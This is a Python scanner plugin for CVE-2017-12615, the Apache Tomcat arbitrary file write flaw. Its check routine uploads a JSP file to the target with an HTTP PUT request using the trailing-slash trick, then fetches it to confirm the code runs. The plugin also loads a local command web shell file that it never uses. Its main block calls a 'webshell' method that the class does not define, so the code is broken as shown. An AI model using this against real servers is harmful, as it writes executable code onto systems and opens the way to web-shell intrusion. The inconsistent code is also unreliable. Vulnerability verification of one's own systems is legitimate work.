#!/usr/bin/env python3

from app.lib.utils.request import request
from app.lib.utils.common import get_capta, get_useragent

class CVE_2017_12615_BaseVerify:
    def __init__(self, url):
        self.info = {
            'name': 'CVE-2017-12615',
            'description': 'Tomcat Arbitrary File Writer Vulnerability, 受影响版本: Apache Tomcat 7.0.0 to 7.0.79',
            'date': '2017-09-19',
            'exptype': 'check',
            'type': 'Arbitrary File Writer'
        }
        self.url = url
        if not self.url.startswith("http") and not self.url.startswith("https"):
            self.url = "http://" + self.url
        self.osname = 'Unknown'
        self.capta = get_capta()
        self.headers = {
            'User-Agent': get_useragent(),
        }
        self.check_payload = '''<%out.print("{check}");%>'''.format(check = self.capta)
    
    def check(self):
    
        """
        检测是否存在漏洞

        :param:

        :return bool True or False: 是否存在漏洞
        """
        
        try:
            with open('app/static/cmd_jsp.jsp', 'r', encoding = 'utf-8') as reader:
                jsp_data = reader.read()
            check_req = request.put(self.url + "/%s.jsp/" %(self.capta), data = self.check_payload, headers = self.headers)
            get_check_req = request.get(self.url + "/%s.jsp" %(self.capta), headers = self.headers)
            if get_check_req.status_code == 200 and self.capta in get_check_req.text.strip():
                return True
            else:  
                return False
        except Exception as e:
            return False
        finally:
            pass
        
if  __name__ == "__main__":
    CVE_2017_12615 = CVE_2017_12615_BaseVerify('http://127.0.0.1:8080')
    print(CVE_2017_12615.webshell('tesy'))


